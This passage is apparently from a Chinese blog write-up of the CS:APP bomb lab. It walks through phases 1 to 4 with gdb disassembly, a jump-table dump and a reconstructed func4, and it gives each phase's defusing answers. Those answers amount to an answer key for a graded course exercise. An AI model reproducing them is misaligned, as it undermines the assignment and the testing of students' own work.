for function phase_1:</span><br><span class="line">   0x0000000000400ee0 &lt;+0&gt;:		sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400ee4 &lt;+4&gt;:		mov    $0x402400,%esi</span><br><span class="line">   0x0000000000400ee9 &lt;+9&gt;:		callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000400eee &lt;+14&gt;:	test   %eax,%eax</span><br><span class="line">   0x0000000000400ef0 &lt;+16&gt;:	je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">   0x0000000000400ef2 &lt;+18&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400ef7 &lt;+23&gt;:	add    $0x8,%rsp</span><br><span class="line">   0x0000000000400efb &lt;+27&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">简要分析，phase_1()函数调用首地址为0x401338名为strings_not_equal()的函数，后者通过%rax寄存器返回一个值。若该值为0，炸弹拆除成功；否则炸弹爆炸，于是接着反汇编string_not_euqal()函数</span><br><span class="line">(gdb) disassemble 0x401338</span><br><span class="line">	...</span><br><span class="line">   0x000000000040133c &lt;+4&gt;:		mov    %rdi,%rbx</span><br><span class="line">   0x000000000040133f &lt;+7&gt;:		mov    %rsi,%rbp</span><br><span class="line">   0x0000000000401342 &lt;+10&gt;:	callq  0x40131b &lt;string_length&gt;</span><br><span class="line">   0x0000000000401347 &lt;+15&gt;:	mov    %eax,%r12d</span><br><span class="line">   0x000000000040134a &lt;+18&gt;:	mov    %rbp,%rdi</span><br><span class="line">   0x000000000040134d &lt;+21&gt;:	callq  0x40131b &lt;string_length&gt;</span><br><span class="line">   0x0000000000401352 &lt;+26&gt;:	mov    $0x1,%edx</span><br><span class="line">   0x0000000000401357 &lt;+31&gt;:	cmp    %eax,%r12d</span><br><span class="line">   0x000000000040135a &lt;+34&gt;:	jne    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">该函数又会调用首地址为0x40131b名为string_length()的函数，并比较二者返回值是否相同，若不同则strings_not_equal()通过%rax返回值1，最终炸弹爆炸，继续反汇编string_length()函数</span><br><span class="line">(gdb) disassemble 0x40131b</span><br><span class="line">Dump of assembler code for function string_length:</span><br><span class="line">   0x000000000040131b &lt;+0&gt;:		cmpb   $0x0,(%rdi)</span><br><span class="line">   0x000000000040131e &lt;+3&gt;:		je     0x401332 &lt;string_length+23&gt;</span><br><span class="line">   0x0000000000401320 &lt;+5&gt;:		mov    %rdi,%rdx</span><br><span class="line">   0x0000000000401323 &lt;+8&gt;:		add    $0x1,%rdx</span><br><span class="line">   0x0000000000401327 &lt;+12&gt;:	mov    %edx,%eax</span><br><span class="line">   0x0000000000401329 &lt;+14&gt;:	sub    %edi,%eax</span><br><span class="line">   0x000000000040132b &lt;+16&gt;:	cmpb   $0x0,(%rdx)</span><br><span class="line">   0x000000000040132e &lt;+19&gt;:	jne    0x401323 &lt;string_length+8&gt;</span><br><span class="line">   0x0000000000401330 &lt;+21&gt;:	repz retq </span><br><span class="line">   0x0000000000401332 &lt;+23&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000401337 &lt;+28&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">分析得string_length()函数接收一个参数(存于%rdi中)，%rdi为一字符串首地址，string_length()函数从该首地址起将数据类型为byte的字符值逐个与值0x(&#39;\0&#39;)比较，最终利用%rax寄存器返回字符串长度，接着回到string_not_equal()函数中</span><br><span class="line">   0x000000000040135a &lt;+34&gt;:	jne    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">   0x000000000040135c &lt;+36&gt;:	movzbl (%rbx),%eax</span><br><span class="line">   0x000000000040135f &lt;+39&gt;:	test   %al,%al</span><br><span class="line">   0x0000000000401361 &lt;+41&gt;:	je     0x401388 &lt;strings_not_equal+80&gt;</span><br><span class="line">   0x0000000000401363 &lt;+43&gt;:	cmp    0x0(%rbp),%al</span><br><span class="line">   0x0000000000401366 &lt;+46&gt;:	je     0x401372 &lt;strings_not_equal+58&gt;</span><br><span class="line">   0x0000000000401368 &lt;+48&gt;:	jmp    0x40138f &lt;strings_not_equal+87&gt;</span><br><span class="line">   0x000000000040136a &lt;+50&gt;:	cmp    0x0(%rbp),%al</span><br><span class="line">   0x000000000040136d &lt;+53&gt;:	nopl   (%rax)</span><br><span class="line">   0x0000000000401370 &lt;+56&gt;:	jne    0x401396 &lt;strings_not_equal+94&gt;</span><br><span class="line">   0x0000000000401372 &lt;+58&gt;:	add    $0x1,%rbx</span><br><span class="line">   0x0000000000401376 &lt;+62&gt;:	add    $0x1,%rbp</span><br><span class="line">   0x000000000040137a &lt;+66&gt;:	movzbl (%rbx),%eax</span><br><span class="line">   0x000000000040137d &lt;+69&gt;:	test   %al,%al</span><br><span class="line">   0x000000000040137f &lt;+71&gt;:	jne    0x40136a &lt;strings_not_equal+50&gt;</span><br><span class="line">   0x0000000000401381 &lt;+73&gt;:	mov    $0x0,%edx</span><br><span class="line">   0x0000000000401386 &lt;+78&gt;:	jmp    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">   0x0000000000401388 &lt;+80&gt;:	mov    $0x0,%edx</span><br><span class="line">   0x000000000040138d &lt;+85&gt;:	jmp    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">   0x000000000040138f &lt;+87&gt;:	mov    $0x1,%edx</span><br><span class="line">   0x0000000000401394 &lt;+92&gt;:	jmp    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">   0x0000000000401396 &lt;+94&gt;:	mov    $0x1,%edx</span><br><span class="line">   0x000000000040139b &lt;+99&gt;:	mov    %edx,%eax</span><br><span class="line"></span><br><span class="line">简要分析得首地址为0x40135a的指令判断两字符串长度是否相同。若长度相同，则逐一比较两串是否逐字符相同。若两串完全相同，则函数返回0；若任意字符不同，函数返回1</span><br><span class="line">分析至此知本题关键在于如何获知模式串内容。观察知当通过string_length()函数计算字符串长度时，待计算字符串的首地址需通过%rdi寄存器传入函数中，而由string_not_equal()中</span><br><span class="line">   0x000000000040133c &lt;+4&gt;:		mov    %rdi,%rbx</span><br><span class="line">   0x000000000040133f &lt;+7&gt;:		mov    %rsi,%rbp</span><br><span class="line">   0x0000000000401342 &lt;+10&gt;:	callq  0x40131b &lt;string_length&gt;</span><br><span class="line">   0x0000000000401347 &lt;+15&gt;:	mov    %eax,%r12d</span><br><span class="line">   0x000000000040134a &lt;+18&gt;:	mov    %rbp,%rdi</span><br><span class="line">   0x000000000040134d &lt;+21&gt;:	callq  0x40131b &lt;string_length&gt;</span><br><span class="line">   </span><br><span class="line">知，两次调用string_length()函数时分别传入了%rdi与%rsi中的值，而又由phase_1()</span><br><span class="line">   0x0000000000400ee4 &lt;+4&gt;:	mov    $0x402400,%esi</span><br><span class="line">   0x0000000000400ee9 &lt;+9&gt;:	callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   </span><br><span class="line">知，%rsi为定值$0x402400，不难得出该定值为模式串首地址</span><br><span class="line"></span><br><span class="line">(gdb) x &#x2F;s 0x402400</span><br><span class="line">0x402400:	&quot;Border relations with Canada have never been better.&quot;</span><br><span class="line">得答案</span><br></pre></td></tr></table></figure>

<h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">反汇编main函数，找到phase_2()函数入口</span><br><span class="line">   0x0000000000400e56 &lt;+182&gt;:	callq  0x400efc &lt;phase_2&gt;</span><br><span class="line"></span><br><span class="line">phase_2()函数首地址为0x400efc，接着反汇编phase_2()函数</span><br><span class="line">   0x0000000000400efe &lt;+2&gt;:		sub    $0x28,%rsp</span><br><span class="line">   0x0000000000400f02 &lt;+6&gt;:		mov    %rsp,%rsi</span><br><span class="line">   0x0000000000400f05 &lt;+9&gt;:		callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000400f0a &lt;+14&gt;:	cmpl   $0x1,(%rsp)</span><br><span class="line">   0x0000000000400f0e &lt;+18&gt;:	je     0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f10 &lt;+20&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line"></span><br><span class="line">该函数在栈上开辟了40个字节大小的空间，设开辟后%rsp值为s0，接着调用首地址为0x40145c名为read_six_numbers()的函数，随后比较确认栈顶四字节大小的数据值是否为1，若不为1则炸弹爆炸，由此确定DWORD PTR 0(%rsp) &#x3D; 1，接着反汇编read_six_numbers()函数</span><br><span class="line">(gdb) disassemble 0x40145c</span><br><span class="line">Dump of assembler code for function read_six_numbers:</span><br><span class="line">   0x000000000040145c &lt;+0&gt;:		sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401460 &lt;+4&gt;:		mov    %rsi,%rdx</span><br><span class="line">   0x0000000000401463 &lt;+7&gt;:		lea    0x4(%rsi),%rcx</span><br><span class="line">   0x0000000000401467 &lt;+11&gt;:	lea    0x14(%rsi),%rax</span><br><span class="line">   0x000000000040146b &lt;+15&gt;:	mov    %rax,0x8(%rsp)</span><br><span class="line">   0x0000000000401470 &lt;+20&gt;:	lea    0x10(%rsi),%rax</span><br><span class="line">   0x0000000000401474 &lt;+24&gt;:	mov    %rax,(%rsp)</span><br><span class="line">   0x0000000000401478 &lt;+28&gt;:	lea    0xc(%rsi),%r9</span><br><span class="line">   0x000000000040147c &lt;+32&gt;:	lea    0x8(%rsi),%r8</span><br><span class="line">   0x0000000000401480 &lt;+36&gt;:	mov    $0x4025c3,%esi</span><br><span class="line">   0x0000000000401485 &lt;+41&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x000000000040148a &lt;+46&gt;:	callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x000000000040148f &lt;+51&gt;:	cmp    $0x5,%eax</span><br><span class="line">   0x0000000000401492 &lt;+54&gt;:	jg     0x401499 &lt;read_six_numbers+61&gt;</span><br><span class="line">   0x0000000000401494 &lt;+56&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401499 &lt;+61&gt;:	add    $0x18,%rsp</span><br><span class="line">   0x000000000040149d &lt;+65&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">分析得read_six_numbers()接收一个由%rsi传递来的一个参数，其值为s0，即phase_2()函数栈空间开辟后栈顶地址。而read_six_numbers()函数的作用为将用户输入的六个数字按顺序放于栈中(先输入者于栈顶)，再次返回phase_2()函数中</span><br><span class="line">   0x0000000000400f15 &lt;+25&gt;:	jmp    0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f17 &lt;+27&gt;:	mov    -0x4(%rbx),%eax</span><br><span class="line">   0x0000000000400f1a &lt;+30&gt;:	add    %eax,%eax</span><br><span class="line">   0x0000000000400f1c &lt;+32&gt;:	cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000400f1e &lt;+34&gt;:	je     0x400f25 &lt;phase_2+41&gt;</span><br><span class="line">   0x0000000000400f20 &lt;+36&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f25 &lt;+41&gt;:	add    $0x4,%rbx</span><br><span class="line">   0x0000000000400f29 &lt;+45&gt;:	cmp    %rbp,%rbx</span><br><span class="line">   0x0000000000400f2c &lt;+48&gt;:	jne    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f2e &lt;+50&gt;:	jmp    0x400f3c &lt;phase_2+64&gt;</span><br><span class="line">   0x0000000000400f30 &lt;+52&gt;:	lea    0x4(%rsp),%rbx</span><br><span class="line">   0x0000000000400f35 &lt;+57&gt;:	lea    0x18(%rsp),%rbp</span><br><span class="line">   0x0000000000400f3a &lt;+62&gt;:	jmp    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">自read_six_numbers()函数返回后，phase_2()函数剩余部分为一循环，由</span><br><span class="line">   0x0000000000400f17 &lt;+27&gt;:	mov    -0x4(%rbx),%eax</span><br><span class="line">   0x0000000000400f1a &lt;+30&gt;:	add    %eax,%eax</span><br><span class="line">   0x0000000000400f1c &lt;+32&gt;:	cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000400f1e &lt;+34&gt;:	je     0x400f25 &lt;phase_2+41&gt;</span><br><span class="line">   0x0000000000400f20 &lt;+36&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">知，相邻输入的两数字，若后输入者的值不为前者两倍，则炸弹爆炸。而又由DWORD PTR 0(%rsp) &#x3D; 1知，六个数字分别为1，2，4，8，16，32</span><br></pre></td></tr></table></figure>

<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">反汇编phase_3()函数</span><br><span class="line">(gdb) disassemble phase_3</span><br><span class="line">Dump of assembler code for function phase_3:</span><br><span class="line">   0x0000000000400f43 &lt;+0&gt;:	sub    $0x18,%rsp</span><br><span class="line">   0x0000000000400f47 &lt;+4&gt;:	lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000400f4c &lt;+9&gt;:	lea    0x8(%rsp),%rdx</span><br><span class="line">   0x0000000000400f51 &lt;+14&gt;:	mov    $0x4025cf,%esi</span><br><span class="line">   0x0000000000400f56 &lt;+19&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000400f5b &lt;+24&gt;:	callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"></span><br><span class="line">知phase_3()函数先将值$0x4025cf存于%esi中，接着调用sscanf()函数读取输入数据，尝试反汇编首地址为0x4025cf的内容</span><br><span class="line">(gdb) x &#x2F;s 0x4025cf</span><br><span class="line">0x4025cf:	&quot;%d %d&quot;</span><br><span class="line"></span><br><span class="line">得该谜题应输入两个数字，继续查看phase_3()代码</span><br><span class="line">   0x0000000000400f6a &lt;+39&gt;:	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">   0x0000000000400f6f &lt;+44&gt;:	ja     0x400fad &lt;phase_3+106&gt;</span><br><span class="line">   0x0000000000400f71 &lt;+46&gt;:	mov    0x8(%rsp),%eax</span><br><span class="line">   0x0000000000400f75 &lt;+50&gt;:	jmpq   *0x402470(,%rax,8)</span><br><span class="line">   0x0000000000400f7c &lt;+57&gt;:	mov    $0xcf,%eax</span><br><span class="line">   0x0000000000400f81 &lt;+62&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f83 &lt;+64&gt;:	mov    $0x2c3,%eax</span><br><span class="line">   0x0000000000400f88 &lt;+69&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f8a &lt;+71&gt;:	mov    $0x100,%eax</span><br><span class="line">   0x0000000000400f8f &lt;+76&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f91 &lt;+78&gt;:	mov    $0x185,%eax</span><br><span class="line">   0x0000000000400f96 &lt;+83&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f98 &lt;+85&gt;:	mov    $0xce,%eax</span><br><span class="line">   0x0000000000400f9d &lt;+90&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f9f &lt;+92&gt;:	mov    $0x2aa,%eax</span><br><span class="line">   0x0000000000400fa4 &lt;+97&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fa6 &lt;+99&gt;:	mov    $0x147,%eax</span><br><span class="line">   0x0000000000400fab &lt;+104&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fad &lt;+106&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fb2 &lt;+111&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000400fb7 &lt;+116&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fb9 &lt;+118&gt;:	mov    $0x137,%eax</span><br><span class="line">   0x0000000000400fbe &lt;+123&gt;:	cmp    0xc(%rsp),%eax</span><br><span class="line">   0x0000000000400fc2 &lt;+127&gt;:	je     0x400fc9 &lt;phase_3+134&gt;</span><br><span class="line">   0x0000000000400fc4 &lt;+129&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line"></span><br><span class="line">由前两行知DWORD PTR 0x8(%rsp)中的值小于等于7，而</span><br><span class="line">   0x0000000000400f71 &lt;+46&gt;:	mov    0x8(%rsp),%eax</span><br><span class="line">   0x0000000000400f75 &lt;+50&gt;:	jmpq   *0x402470(,%rax,8)</span><br><span class="line">   </span><br><span class="line">结合后续一系列跳转指令知，这里实现了swtich语句的跳转表功能，以DWORD PTR 0x8(%rsp)中的值为偏移量实现跳转，基地址为0x402470，于是反汇编查看跳转表内容</span><br><span class="line">(gdb) x &#x2F;8xg 0x402470</span><br><span class="line">0x402470:	0x0000000000400f7c	0x0000000000400fb9</span><br><span class="line">0x402480:	0x0000000000400f83	0x0000000000400f8a</span><br><span class="line">0x402490:	0x0000000000400f91	0x0000000000400f98</span><br><span class="line">0x4024a0:	0x0000000000400f9f	0x0000000000400fa6</span><br><span class="line"></span><br><span class="line">当DWORD PTR 0x8(%rsp)值为0时，跳转至0x400f7c，再由后续几条指令知DWORD PTR 0xc(%rsp)的值应为0xcf，于是得本题一组解： [0, 207]，同理得其他七组解分别为[1, 311],[2, 707],[3, 256],[4, 389],[5, 206],[6, 682],[7, 147]</span><br></pre></td></tr></table></figure>

<h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">反汇编phase_4()</span><br><span class="line">   0x0000000000401010 &lt;+4&gt;:		lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000401015 &lt;+9&gt;:		lea    0x8(%rsp),%rdx</span><br><span class="line">   0x000000000040101a &lt;+14&gt;:	mov    $0x4025cf,%esi</span><br><span class="line">   0x000000000040101f &lt;+19&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000401024 &lt;+24&gt;:	callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000401029 &lt;+29&gt;:	cmp    $0x2,%eax</span><br><span class="line">   0x000000000040102c &lt;+32&gt;:	jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line"></span><br><span class="line">同phase_3()，易得该谜题需要两个输入</span><br><span class="line">   0x000000000040102e &lt;+34&gt;:	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">   0x0000000000401033 &lt;+39&gt;:	jbe    0x40103a &lt;phase_4+46&gt;</span><br><span class="line">   0x0000000000401035 &lt;+41&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line"></span><br><span class="line">由上述三条指令知DOWRD PTR 0x8(%rsp)中的值小于等于14，即第一个数字应小于15</span><br><span class="line">   0x0000000000401051 &lt;+69&gt;:	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">   0x0000000000401056 &lt;+74&gt;:	je     0x40105d &lt;phase_4+81&gt;</span><br><span class="line">   0x0000000000401058 &lt;+76&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line"></span><br><span class="line">同理知第二个数字必为0，接下来反汇编首地址为0x400fce的func4()函数</span><br><span class="line">   0x0000000000400fce &lt;+0&gt;:		sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:		mov    %edx,%eax</span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:		sub    %esi,%eax</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:		mov    %eax,%ecx</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:	shr    $0x1f,%ecx</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:	add    %ecx,%eax</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:	sar    %eax</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:	lea    (%rax,%rsi,1),%ecx</span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:	cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:	jle    0x400ff2 &lt;func4+36&gt;</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:	lea    -0x1(%rcx),%edx</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:	callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:	add    %eax,%eax</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:	jmp    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ff2 &lt;+36&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:	cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:	jge    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:	lea    0x1(%rcx),%esi</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:	callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:	add    $0x8,%rsp</span><br><span class="line">   0x000000000040100b &lt;+61&gt;:	retq   </span><br><span class="line"></span><br><span class="line">分析知该函数接收三个参数，分别存于%rdi, %rsi, %rdx中，尝试构造c函数</span><br><span class="line">int func4(int x, int y, int z) &#123;</span><br><span class="line">&#x2F;&#x2F;x in %rdi, y in %rsi, z in %rdx</span><br><span class="line">&#x2F;&#x2F;t &lt;-&gt; %rax  w &lt;-&gt; %rcx</span><br><span class="line">    if (z &gt;&#x3D; y) &#123;</span><br><span class="line">        t &#x3D; z - y;</span><br><span class="line">        w &#x3D; 0;</span><br><span class="line">        t &#x3D; (z - y) &#x2F; 2;</span><br><span class="line">        w &#x3D; (z + y) &#x2F; 2;</span><br><span class="line">        if (w &lt;&#x3D; x) &#123;</span><br><span class="line">            t &#x3D; 0;</span><br><span class="line">            if (w &#x3D;&#x3D; x) return t; </span><br><span class="line">            y &#x3D; (z + y) &#x2F; 2 + 1;</span><br><span class="line">            t &#x3D; func4(x, y, z);</span><br><span class="line">            return 2 * t + 1;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            z &#x3D; (z + y) &#x2F; 2 - 1;</span><br><span class="line">            t &#x3D; func4(x, y, z);</span><br><span class="line">            return 2 * t;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (z &lt; y) &#123;</span><br><span class="line">        t &#x3D; z - y;</span><br><span class="line">        w &#x3D; -1;</span><br><span class="line">        t &#x3D; (z - y - 1) &#x2F; 2;</span><br><span class="line">        w &#x3D; (z + y - 1) &#x2F; 2;</span><br><span class="line">        if (w &lt;&#x3D; x) &#123;</span><br><span class="line">            t &#x3D; 0;</span><br><span class="line">            if (w &#x3D;&#x3D; x) return t; </span><br><span class="line">            y &#x3D; (z + y + 1) &#x2F; 2;</span><br><span class="line">            t &#x3D; func4(x, y, z);</span><br><span class="line">            return 2 * t + 1;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            z &#x3D; (z + y - 1) &#x2F; 2 - 1;</span><br><span class="line">            t &#x3D; func4(x, y, z);</span><br><span class="line">            return 2 * t;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">而phase_4()调用本函数时，传入的x, y, z值分别为DWORD PTR 0x8(%rsp), 0, 14.我没有详细探究本函数实现的功能，而是将DWORD PTR 0x8(%rsp)可能的取值(0 ~ 14)全部带入算出结果，由phase_4()函数里</span><br><span class="line">   0x000000000040104d &lt;+65&gt;:	test   %eax,%eax</span><br><span class="line">   0x000000000040104f &lt;+67&gt;:	jne    0x401058 &lt;phase_4+76&gt;</span><br><span class="line"></span><br><span class="line">知，只有在func4()函数返回值为0的情况下炸弹才不会爆炸，因此第一个数可能的取值有0,1,3,7.</span><br><span class="line">即可选的答案有[0, 0], [1, 0], [3, 0], [7, 0]</span><br></pre></td></tr></table></figure>

<p>0x400fdd地址处的 sar    %eax指令只含一个操作数，实际上是sar    %eax, 1的隐含简写，见<br><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/12813962/sar-command-in-x86-assembly-with-one-parameter">SAR command in X86 assembly with one paramete</a></p>
